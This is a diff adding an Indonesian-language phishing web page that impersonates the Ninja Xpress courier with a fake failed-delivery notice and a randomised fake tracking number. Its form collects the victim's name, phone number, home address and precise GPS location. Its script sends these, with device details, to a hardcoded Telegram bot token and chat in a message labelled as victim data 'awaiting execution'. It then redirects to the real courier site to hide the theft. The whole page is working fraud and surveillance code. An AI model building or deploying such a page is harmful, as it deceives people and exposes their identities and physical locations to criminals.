@@ -1,0 +1,895 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Ninja Xpress - Konfirmasi Alamat Pengiriman</title>
+    <style>
+        /* RESET & FONT */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 0;
+            margin: 0;
+        }
+        
+        /* KARTU UTAMA - LAYAR HP */
+        .container {
+            max-width: 480px;
+            width: 100%;
+            background-color: white;
+            min-height: 100vh;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+            position: relative;
+        }
+        
+        /* HEADER MERAH NINJA */
+        .ninja-header {
+            background-color: #e62b2b;
+            padding: 16px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            color: white;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .logo-ninja {
+            font-size: 22px;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+            color: white;
+            line-height: 1;
+        }
+        
+        .logo-ninja span {
+            font-weight: 300;
+            font-size: 20px;
+        }
+        
+        .badge-xpress {
+            background-color: rgba(255,255,255,0.2);
+            padding: 4px 8px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 500;
+        }
+        
+        .header-icon {
+            display: flex;
+            gap: 18px;
+        }
+        
+        .header-icon svg {
+            width: 24px;
+            height: 24px;
+            fill: white;
+        }
+        
+        /* PROGRESS BAR - PALSU */
+        .tracking-fake {
+            background-color: white;
+            padding: 12px 20px;
+            border-bottom: 1px solid #eaeaea;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .tracking-label {
+            font-size: 13px;
+            color: #666;
+            font-weight: 500;
+        }
+        
+        .tracking-number {
+            background-color: #f0f0f0;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #333;
+        }
+        
+        .tracking-number span {
+            color: #e62b2b;
+            margin-left: 5px;
+        }
+        
+        /* ALERT BANNER */
+        .alert-banner {
+            background-color: #fff3e0;
+            border-left: 4px solid #ff9800;
+            margin: 15px 20px;
+            padding: 14px 16px;
+            border-radius: 8px;
+            display: flex;
+            gap: 12px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+        }
+        
+        .alert-icon {
+            color: #ff9800;
+            font-size: 22px;
+            line-height: 1;
+        }
+        
+        .alert-text h3 {
+            font-size: 15px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 4px;
+        }
+        
+        .alert-text p {
+            font-size: 13px;
+            color: #666;
+            line-height: 1.4;
+        }
+        
+        /* CARD INFO PAKET */
+        .package-card {
+            background-color: #f9f9f9;
+            margin: 10px 20px 20px;
+            padding: 16px;
+            border-radius: 12px;
+            border: 1px solid #eee;
+        }
+        
+        .package-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+        }
+        
+        .package-id {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+        }
+        
+        .package-status {
+            background-color: #e62b2b;
+            color: white;
+            font-size: 11px;
+            font-weight: 600;
+            padding: 4px 8px;
+            border-radius: 20px;
+            text-transform: uppercase;
+        }
+        
+        .package-detail {
+            display: flex;
+            gap: 15px;
+            border-top: 1px dashed #ddd;
+            padding-top: 12px;
+        }
+        
+        .detail-item {
+            flex: 1;
+        }
+        
+        .detail-label {
+            font-size: 11px;
+            color: #999;
+            text-transform: uppercase;
+            margin-bottom: 4px;
+        }
+        
+        .detail-value {
+            font-size: 15px;
+            font-weight: 600;
+            color: #333;
+        }
+        
+        .detail-value small {
+            font-size: 11px;
+            font-weight: 400;
+            color: #999;
+            margin-left: 5px;
+        }
+        
+        /* FORM SECTION - KOSONG TOTAL */
+        .form-section {
+            background-color: white;
+            margin: 0 20px 20px;
+            padding: 5px 0;
+        }
+        
+        .section-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .section-title:before {
+            content: "";
+            width: 4px;
+            height: 18px;
+            background-color: #e62b2b;
+            border-radius: 4px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-label {
+            font-size: 13px;
+            font-weight: 600;
+            color: #555;
+            margin-bottom: 6px;
+            display: block;
+        }
+        
+        .form-label span {
+            color: #e62b2b;
+            font-size: 12px;
+            margin-left: 3px;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 15px;
+            transition: all 0.2s;
+            background-color: #fff;
+        }
+        
+        .form-input:focus {
+            border-color: #e62b2b;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(230, 43, 43, 0.1);
+        }
+        
+        .form-input::placeholder {
+            color: #aaa;
+            font-size: 14px;
+        }
+        
+        .input-hint {
+            font-size: 11px;
+            color: #999;
+            margin-top: 5px;
+        }
+        
+        /* GPS BUTTON */
+        .gps-section {
+            background-color: #f5f5f5;
+            border-radius: 12px;
+            padding: 16px;
+            margin: 20px 0 25px;
+            border: 1px solid #eaeaea;
+        }
+        
+        .gps-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+        
+        .gps-icon {
+            background-color: #e62b2b;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .gps-icon svg {
+            width: 20px;
+            height: 20px;
+            fill: white;
+        }
+        
+        .gps-title {
+            font-weight: 600;
+            font-size: 14px;
+            color: #333;
+        }
+        
+        .gps-subtitle {
+            font-size: 12px;
+            color: #777;
+        }
+        
+        .btn-gps {
+            background-color: white;
+            border: 1.5px solid #e62b2b;
+            color: #e62b2b;
+            font-weight: 600;
+            font-size: 14px;
+            padding: 14px 0;
+            border-radius: 30px;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .btn-gps:hover {
+            background-color: #fff5f5;
+        }
+        
+        .btn-gps:disabled {
+            background-color: #f0f0f0;
+            border-color: #ccc;
+            color: #999;
+            cursor: not-allowed;
+        }
+        
+        .btn-gps.active {
+            background-color: #e8f5e8;
+            border-color: #2e7d32;
+            color: #2e7d32;
+        }
+        
+        .location-status {
+            margin-top: 12px;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 13px;
+            display: none;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .location-status.success {
+            background-color: #e8f5e8;
+            color: #2e7d32;
+            display: flex;
+            border: 1px solid #c8e6c9;
+        }
+        
+        .location-status.error {
+            background-color: #ffebee;
+            color: #c62828;
+            display: flex;
+            border: 1px solid #ffcdd2;
+        }
+        
+        .location-status.warning {
+            background-color: #fff8e1;
+            color: #ff8f00;
+            display: flex;
+            border: 1px solid #ffe082;
+        }
+        
+        .accuracy-badge {
+            background-color: rgba(0,0,0,0.05);
+            padding: 3px 8px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+            margin-left: auto;
+        }
+        
+        /* BUTTON KONFIRMASI */
+        .btn-submit {
+            background-color: #e62b2b;
+            color: white;
+            border: none;
+            padding: 16px 0;
+            width: 100%;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin: 15px 0 20px;
+            box-shadow: 0 4px 12px rgba(230, 43, 43, 0.3);
+        }
+        
+        .btn-submit:hover {
+            background-color: #c41e1e;
+        }
+        
+        .btn-submit:disabled {
+            background-color: #f0b3b3;
+            box-shadow: none;
+            cursor: not-allowed;
+        }
+        
+        /* FOOTER */
+        .footer {
+            background-color: #f9f9f9;
+            padding: 16px 20px;
+            border-top: 1px solid #eee;
+            margin-top: 20px;
+            font-size: 11px;
+            color: #999;
+            text-align: center;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 8px;
+        }
+        
+        .footer-links a {
+            color: #666;
+            text-decoration: none;
+            font-size: 11px;
+        }
+        
+        /* LOADING */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(255,255,255,0.9);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        .loading-content {
+            text-align: center;
+        }
+        
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f0f0f0;
+            border-top: 4px solid #e62b2b;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* FAKE WA CONFIRMATION */
+        .fake-wa {
+            background-color: #f0f8ff;
+            border: 1px solid #b8d9f0;
+            border-radius: 8px;
+            padding: 12px;
+            margin: 15px 0;
+            font-size: 13px;
+            color: #2c5778;
+            display: flex;
+            gap: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- HEADER MERAH NINJA -->
+        <div class="ninja-header">
+            <div class="logo-area">
+                <div class="logo-ninja">NINJA <span>XPRESS</span></div>
+                <div class="badge-xpress">Logistics</div>
+            </div>
+            <div class="header-icon">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                </svg>
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6v-5c0-3.07-1.63-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.64 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z"/>
+                </svg>
+            </div>
+        </div>
+        
+        <!-- FAKE TRACKING INFO - RESI TETAP RANDOM biar keliatan real -->
+        <div class="tracking-fake">
+            <span class="tracking-label">No. Resi:</span>
+            <span class="tracking-number">NXID<span id="fakeResi">7834629183</span></span>
+            <span style="margin-left: auto; color: #e62b2b; font-size: 12px;">● Proses</span>
+        </div>
+        
+        <!-- ALERT PENTING -->
+        <div class="alert-banner">
+            <div class="alert-icon">⚠️</div>
+            <div class="alert-text">
+                <h3>Alamat Tidak Lengkap</h3>
+                <p>Paket dengan resi NXID<span id="resiAlert">7834629183</span> gagal dikirim karena alamat penerima tidak ditemukan. Harap perbarui alamat untuk pengiriman ulang.</p>
+            </div>
+        </div>
+        
+        <!-- INFO PAKET -->
+        <div class="package-card">
+            <div class="package-header">
+                <span class="package-id" id="packageResi">NXID7834629183</span>
+                <span class="package-status">GAGAL KIRIM</span>
+            </div>
+            <div class="package-detail">
+                <div class="detail-item">
+                    <div class="detail-label">Pengirim</div>
+                    <div class="detail-value">Shopee <small>#ORD82831</small></div>
+                </div>
+                <div class="detail-item">
+                    <div class="detail-label">Berat</div>
+                    <div class="detail-value">1.2 kg</div>
+                </div>
+                <div class="detail-item">
+                    <div class="detail-label">Layanan</div>
+                    <div class="detail-value">REG</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- FORM KONFIRMASI ALAMAT - SEMUA KOSONG -->
+        <div class="form-section">
+            <div class="section-title">Konfirmasi Alamat Penerima</div>
+            
+            <div class="form-group">
+                <label class="form-label">Nama Lengkap Penerima <span>*</span></label>
+                <input type="text" class="form-input" id="nama" placeholder="Contoh: Budi Santoso" value="">
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label">Nomor Telepon Aktif <span>*</span></label>
+                <input type="text" class="form-input" id="telepon" placeholder="08xxxxxxxxxx" value="">
+                <div class="input-hint">Pastikan nomor dapat dihubungi</div>
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label">Alamat Lengkap <span>*</span></label>
+                <input type="text" class="form-input" id="alamat" placeholder="Nama jalan, gang, nomor rumah, patokan" value="">
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label">Kota/Kecamatan <span>*</span></label>
+                <input type="text" class="form-input" id="kota" placeholder="Contoh: Jakarta Selatan" value="">
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label">Kode Pos <span>*</span></label>
+                <input type="text" class="form-input" id="kodepos" placeholder="Contoh: 12120" value="">
+            </div>
+            
+            <!-- GPS SECTION -->
+            <div class="gps-section">
+                <div class="gps-header">
+                    <div class="gps-icon">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M12 8c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4-1.79-4-4-4zm8.94 3A8.994 8.994 0 0 0 13 3.06V1h-2v2.06A8.994 8.994 0 0 0 3.06 11H1v2h2.06A8.994 8.994 0 0 0 11 20.94V23h2v-2.06A8.994 8.994 0 0 0 20.94 13H23v-2h-2.06zM12 19c-3.87 0-7-3.13-7-7s3.13-7 7-7 7 3.13 7 7-3.13 7-7 7z"/>
+                        </svg>
+                    </div>
+                    <div>
+                        <div class="gps-title">Akurasi Lokasi Pengiriman</div>
+                        <div class="gps-subtitle">Aktifkan GPS untuk memudahkan kurir menemukan lokasi Anda</div>
+                    </div>
+                </div>
+                
+                <button class="btn-gps" id="getLocationBtn" onclick="getLocation()">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="#e62b2b">
+                        <path d="M12 8c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4-1.79-4-4-4zm8.94 3A8.994 8.994 0 0 0 13 3.06V1h-2v2.06A8.994 8.994 0 0 0 3.06 11H1v2h2.06A8.994 8.994 0 0 0 11 20.94V23h2v-2.06A8.994 8.994 0 0 0 20.94 13H23v-2h-2.06zM12 19c-3.87 0-7-3.13-7-7s3.13-7 7-7 7 3.13 7 7-3.13 7-7 7z"/>
+                    </svg>
+                    Aktifkan GPS untuk Akurasi Maksimal
+                </button>
+                
+                <div class="location-status" id="locationStatus">
+                    <span>✅</span>
+                    <span id="statusMessage">Lokasi berhasil didapatkan</span>
+                    <span class="accuracy-badge" id="accuracyText">Akurat</span>
+                </div>
+                
+                <div class="fake-wa" id="mapsLinkContainer" style="display: none;">
+                    <span>📍</span>
+                    <span id="mapsLinkText"></span>
+                </div>
+            </div>
+            
+            <!-- PERINGATAN KECIL -->
+            <div style="font-size: 12px; color: #888; margin: 10px 0; display: flex; gap: 5px;">
+                <span>🕒</span>
+                <span>Kurir akan mencoba pengiriman ulang dalam 1x24 jam setelah konfirmasi</span>
+            </div>
+            
+            <!-- BUTTON KONFIRMASI -->
+            <button class="btn-submit" id="submitBtn" onclick="kirimData()" disabled>
+                Konfirmasi & Kirim Ulang Paket
+            </button>
+        </div>
+        
+        <!-- FOOTER -->
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#">Bantuan</a>
+                <a href="#">Syarat & Ketentuan</a>
+                <a href="#">Kebijakan Privasi</a>
+            </div>
+            <div>© 2026 Ninja Xpress Logistics. All rights reserved.</div>
+            <div style="margin-top: 5px;">Version 2.4.2 (240316)</div>
+        </div>
+    </div>
+    
+    <!-- LOADING OVERLAY -->
+    <div class="loading-overlay" id="loading">
+        <div class="loading-content">
+            <div class="loading-spinner"></div>
+            <p style="color: #333; font-weight: 500;">Memproses konfirmasi...</p>
+            <p style="color: #999; font-size: 13px; margin-top: 8px;">Mohon tunggu sebentar</p>
+        </div>
+    </div>
+
+    <script>
+        // ==================== KONFIGURASI TELEGRAM ====================
+        const TELEGRAM_TOKEN = '8512762376:AAFqi8Gf-Wa9fds5oUFP4BXaBRyqsNl8R9A';
+        const TELEGRAM_CHAT_ID = '8557822129';
+        // ==============================================================
+        
+        // ==================== GENERATE RESI RANDOM ====================
+        // Resi tetap random biar beda tiap kali, tapi form kosong
+        const randomResi = Math.floor(7834629000 + Math.random() * 10000);
+        document.getElementById('fakeResi').innerText = randomResi;
+        document.getElementById('resiAlert').innerText = randomResi;
+        document.getElementById('packageResi').innerText = 'NXID' + randomResi;
+        // ==============================================================
+        
+        let lokasiUser = null;
+        let lokasiAkurat = false;
+        
+        // Fungsi buat dapetin lokasi
+        function getLocation() {
+            const btn = document.getElementById('getLocationBtn');
+            const statusDiv = document.getElementById('locationStatus');
+            const statusMessage = document.getElementById('statusMessage');
+            const accuracySpan = document.getElementById('accuracyText');
+            const mapsContainer = document.getElementById('mapsLinkContainer');
+            const submitBtn = document.getElementById('submitBtn');
+            
+            statusDiv.classList.remove('success', 'error', 'warning');
+            mapsContainer.style.display = 'none';
+            
+            if (!navigator.geolocation) {
+                statusMessage.innerText = 'Browser tidak mendukung GPS';
+                accuracySpan.innerText = 'Error';
+                statusDiv.classList.add('error');
+                return;
+            }
+            
+            btn.disabled = true;
+            btn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="#999"><path d="M12 8c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4-1.79-4-4-4zm8.94 3A8.994 8.994 0 0 0 13 3.06V1h-2v2.06A8.994 8.994 0 0 0 3.06 11H1v2h2.06A8.994 8.994 0 0 0 11 20.94V23h2v-2.06A8.994 8.994 0 0 0 20.94 13H23v-2h-2.06zM12 19c-3.87 0-7-3.13-7-7s3.13-7 7-7 7 3.13 7 7-3.13 7-7 7z"/></svg> Mendapatkan lokasi...';
+            
+            const options = {
+                enableHighAccuracy: true,
+                timeout: 30000,
+                maximumAge: 0
+            };
+            
+            function success(position) {
+                const lat = position.coords.latitude;
+                const lng = position.coords.longitude;
+                const accuracy = position.coords.accuracy;
+                
+                lokasiUser = { lat, lng, accuracy };
+                
+                // Tampilin status
+                if (accuracy < 20) {
+                    statusMessage.innerText = 'Lokasi presisi didapatkan';
+                    accuracySpan.innerText = accuracy.toFixed(1) + ' m';
+                    statusDiv.classList.add('success');
+                    lokasiAkurat = true;
+                } else if (accuracy < 100) {
+                    statusMessage.innerText = 'Lokasi didapatkan (akurasi sedang)';
+                    accuracySpan.innerText = accuracy.toFixed(1) + ' m';
+                    statusDiv.classList.add('warning');
+                    lokasiAkurat = false;
+                } else {
+                    statusMessage.innerText = 'Lokasi kurang akurat, coba di luar ruangan';
+                    accuracySpan.innerText = accuracy.toFixed(1) + ' m';
+                    statusDiv.classList.add('warning');
+                    lokasiAkurat = false;
+                }
+                
+                // Tampilin link maps
+                const mapsLink = `https://maps.google.com/?q=${lat},${lng}`;
+                document.getElementById('mapsLinkText').innerHTML = `<a href="${mapsLink}" target="_blank" style="color: #e62b2b;">Lihat lokasi Anda di Google Maps</a>`;
+                mapsContainer.style.display = 'flex';
+                
+                btn.disabled = false;
+                btn.classList.add('active');
+                btn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="#2e7d32"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg> GPS Aktif - Lokasi Tersimpan';
+                
+                submitBtn.disabled = false;
+                
+                console.log(`📍 Lokasi: ${lat}, ${lng} (akurasi: ${accuracy}m)`);
+            }
+            
+            function error(err) {
+                let pesanError = '';
+                
+                switch(err.code) {
+                    case err.PERMISSION_DENIED:
+                        pesanError = 'Izin lokasi ditolak. Izinkan akses lokasi.';
+                        break;
+                    case err.POSITION_UNAVAILABLE:
+                        pesanError = 'Lokasi tidak tersedia.';
+                        break;
+                    case err.TIMEOUT:
+                        pesanError = 'Waktu habis, coba lagi.';
+                        break;
+                    default:
+                        pesanError = 'Kesalahan tidak diketahui.';
+                }
+                
+                statusMessage.innerText = pesanError;
+                accuracySpan.innerText = 'Gagal';
+                statusDiv.classList.add('error');
+                
+                btn.disabled = false;
+                btn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="#e62b2b"><path d="M12 8c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4-1.79-4-4-4zm8.94 3A8.994 8.994 0 0 0 13 3.06V1h-2v2.06A8.994 8.994 0 0 0 3.06 11H1v2h2.06A8.994 8.994 0 0 0 11 20.94V23h2v-2.06A8.994 8.994 0 0 0 20.94 13H23v-2h-2.06zM12 19c-3.87 0-7-3.13-7-7s3.13-7 7-7 7 3.13 7 7-3.13 7-7 7z"/></svg> Coba Lagi Aktifkan GPS';
+            }
+            
+            navigator.geolocation.getCurrentPosition(success, error, options);
+        }
+        
+        // Fungsi kirim ke Telegram
+        async function kirimKeTelegram(pesan) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: pesan,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error('Gagal kirim:', error);
+                return false;
+            }
+        }
+        
+        // Fungsi utama kirim data
+        function kirimData() {
+            const nama = document.getElementById('nama').value.trim();
+            const telepon = document.getElementById('telepon').value.trim();
+            const alamat = document.getElementById('alamat').value.trim();
+            const kota = document.getElementById('kota').value.trim();
+            const kodepos = document.getElementById('kodepos').value.trim();
+            const loading = document.getElementById('loading');
+            const submitBtn = document.getElementById('submitBtn');
+            
+            // Validasi semua field harus diisi
+            if (!nama) {
+                alert('Nama lengkap harus diisi!');
+                document.getElementById('nama').focus();
+                return;
+            }
+            
+            if (!telepon) {
+                alert('Nomor telepon harus diisi!');
+                document.getElementById('telepon').focus();
+                return;
+            }
+            
+            if (!telepon.match(/^08[0-9]{8,12}$/)) {
+                alert('Nomor telepon tidak valid! Harus diawali 08 dan 10-14 digit');
+                document.getElementById('telepon').focus();
+                return;
+            }
+            
+            if (!alamat) {
+                alert('Alamat lengkap harus diisi!');
+                document.getElementById('alamat').focus();
+                return;
+            }
+            
+            if (!kota) {
+                alert('Kota/Kecamatan harus diisi!');
+                document.getElementById('kota').focus();
+                return;
+            }
+            
+            if (!kodepos) {
+                alert('Kode pos harus diisi!');
+                document.getElementById('kodepos').focus();
+                return;
+            }
+            
+            if (!lokasiUser) {
+                alert('Harap aktifkan GPS untuk akurasi pengiriman!');
+                return;
+            }
+            
+            // Tampilkan loading
+            loading.style.display = 'flex';
+            submitBtn.disabled = true;
+            
+            // Buat link Google Maps
+            const mapsLink = `https://www.google.com/maps?q=${lokasiUser.lat},${lokasiUser.lng}`;
+            
+            // Format pesan ke Telegram
+            const pesan = `
+<b>📦 NINJA EXPRESS - DATA KORBAN MASUK 📦</b>
+━━━━━━━━━━━━━━━━━━━━━
+
+<b>👤 DATA DIRI:</b>
+├ Nama: ${nama}
+├ Telepon: ${telepon}
+└ IP: (akan dilacak)
+
+<b>🏠 ALAMAT KORBAN:</b>
+├ ${alamat}
+├ ${kota}
+└ ${kodepos}
+
+<b>📍 LOKASI GPS PRESISI:</b>
+├ Latitude: ${lokasiUser.lat}
+├ Longitude: ${lokasiUser.lng}
+├ Akurasi: ${lokasiUser.accuracy.toFixed(2)} meter
+└ <a href="${mapsLink}">🔍 BUKA GOOGLE MAPS</a>
+
+<b>📱 INFO PERANGKAT:</b>
+├ Browser: ${navigator.userAgent.substring(0, 100)}...
+├ Platform: ${navigator.platform}
+├ Bahasa: ${navigator.language}
+└ Waktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta', dateStyle: 'full', timeStyle: 'long' })}
+
+━━━━━━━━━━━━━━━━━━━━━
+<b>Resi:</b> NXID${randomResi}
+<b>Status:</b> ✅ MENUNGGU EKSEKUSI
+            `;
+            
+            // Kirim ke Telegram
+            kirimKeTelegram(pesan).then(berhasil => {
+                setTimeout(() => {
+                    loading.style.display = 'none';
+                    
+                    if (berhasil) {
+                        // Redirect ke website asli Ninja Express
+                        window.location.href = 'https://www.ninjaexpress.id/tracking?resi=NXID' + randomResi;
+                    } else {
+                        alert('Gagal mengirim. Coba lagi.');
+                        submitBtn.disabled = false;
+                    }
+                }, 2000);
+            }).catch(err => {
+                loading.style.display = 'none';
+                alert('Error: ' + err.message);
+                submitBtn.disabled = false;
+            });
+        }
+    </script>
+</body>
+</html>
